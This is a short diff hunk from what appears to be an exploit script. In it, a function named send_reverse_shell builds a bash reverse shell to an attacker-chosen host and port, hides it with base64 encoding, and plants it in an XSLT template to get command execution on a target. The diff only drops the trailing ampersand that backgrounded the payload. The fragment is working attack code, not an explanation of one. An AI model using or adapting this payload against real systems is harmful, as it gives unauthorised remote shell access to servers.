@@ -213,7 +213,7 @@ def send_reverse_shell(session, base_url, token, uuid, lhost, lport):
     """
     inner = f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"
     b64 = base64.b64encode(inner.encode()).decode()
-    payload = f"printf {b64}|base64 -d|bash &"
+    payload = f"printf {b64}|base64 -d|bash "
 
     name = rand_name("rs")
     xsl = XSLT_SHELL_TEMPLATE.replace("{PAYLOAD}", payload)
